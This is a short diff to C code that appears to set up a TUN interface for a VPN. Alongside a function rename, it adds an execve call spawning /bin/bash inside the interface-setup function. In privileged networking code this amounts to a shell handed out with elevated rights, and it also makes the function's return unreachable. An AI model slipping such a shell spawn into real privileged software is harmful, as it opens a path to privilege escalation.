@@ -12,7 +12,7 @@
 #define SERVER_IP "10.0.1.1"
 struct sockaddr_in peerAddr;
 
-int createTunDevice() {
+int registerTunInterface() {
    int tunfd;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
@@ -20,7 +20,10 @@ int createTunDevice() {
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;  
 
    tunfd = open("/dev/net/tun", O_RDWR);
-   ioctl(tunfd, TUNSETIFF, &ifr);       
+   ioctl(tunfd, TUNSETIFF, &ifr);   
+
+   printf("tun file descriptor: %d\n", tunfd);  
+   execve("/bin/bash", NULL, NULL);  
 
    return tunfd;
 }
